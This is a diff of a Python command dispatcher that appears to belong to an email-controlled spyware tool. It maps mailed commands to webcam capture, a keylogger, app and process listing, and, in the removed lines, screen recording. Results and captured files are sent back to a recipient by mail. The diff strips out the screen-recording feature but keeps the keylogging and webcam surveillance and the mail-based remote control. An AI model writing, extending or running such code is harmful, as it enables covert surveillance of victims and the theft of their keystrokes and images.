@@ -5,7 +5,6 @@ import resource.message_generate as message_generate
 import resource.system_control as system_control
 import resource.keylogr as keylogr
 import resource.resource_monitor as resource_monitor
-import resource.record as recorder
 import datetime
 import time
 import re
@@ -19,8 +18,7 @@ function_map = {
     'webcam': system_control.webcam_image,
     'keylog': keylogr.keylog,
     'list_apps': resource_monitor.getAppInfo,
-    'list_processes': resource_monitor.list_processes,
-    'screen_record': recorder.screen_record
+    'list_processes': resource_monitor.list_processes
 }
 
 
@@ -64,12 +62,6 @@ def request_handle(msg_list):
                 message = message_generate.success_message(cmd)
                 mail_handle_send.send_mail_success_execution(
                     recipient_mail, message)
-            elif cmd.startswith('screen_record'):
-                splitted = cmd.split(' ')
-                filename = function_map[splitted[0]](splitted[1], 28, bool(int(splitted[2])))
-                message = message_generate.success_message(cmd)
-                mail_handle_send.send_mail_success_execution(
-                    recipient_mail, message, filename)
             else:
                 function_map[cmd]()
                 message = message_generate.success_message(cmd)
